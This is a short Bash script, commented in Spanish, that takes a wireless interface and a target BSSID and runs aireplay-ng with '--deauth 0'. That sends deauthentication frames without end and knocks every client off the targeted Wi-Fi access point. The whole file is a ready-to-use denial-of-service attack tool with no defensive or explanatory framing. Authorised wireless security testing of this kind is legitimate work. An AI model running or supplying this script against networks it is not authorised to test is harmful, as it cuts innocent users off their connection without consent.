#!/bin/bash

# Verificar que se han proporcionado dos argumentos
if [ "$#" -ne 2 ]; then
    echo "Usage: $0 <interfaz> <BSSID>"
    exit 1
fi

# Asignar los argumentos a variables
interfaz="$1"
bssid="$2"

# Ejecutar aireplay-ng
aireplay-ng --deauth 0 -a "$bssid" "$interfaz"
